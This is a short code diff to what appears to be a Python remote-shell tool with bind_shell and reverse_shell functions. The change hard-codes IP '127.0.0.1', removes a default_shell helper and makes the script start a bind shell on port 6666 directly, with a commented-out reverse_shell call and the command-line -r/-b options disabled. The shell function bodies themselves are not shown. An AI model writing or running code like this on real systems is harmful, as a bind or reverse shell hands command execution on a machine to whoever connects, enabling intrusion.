@@ -7,6 +7,8 @@ import os
 import sys
 import socket
 
+IP='127.0.0.1'
+
 class tcp_socket():
 
     def listen_on(self, port):
@@ -90,23 +92,18 @@ def bind_shell(PORT):
     x.listen_on(PORT)
     easy_cmd(x)
 
-def default_shell():
-    #edit here
-    #
-    #reverse_shell('127.0.0.1', 6666)
-    bind_shell(6666)
-
 if __name__ == '__main__':
+    
+    #reverse_shell(IP, 6666)
+    bind_shell(6666)
+    
+'''
     if len(sys.argv) > 3:
         if sys.argv[1] == "-r":
             reverse_shell(sys.argv[2], sys.argv[3])
         if sys.argv[1] == "-b":
             bind_shell(sys.argv[2])
-    else:
-        default_shell()
-
-
-
+'''
 
 
 
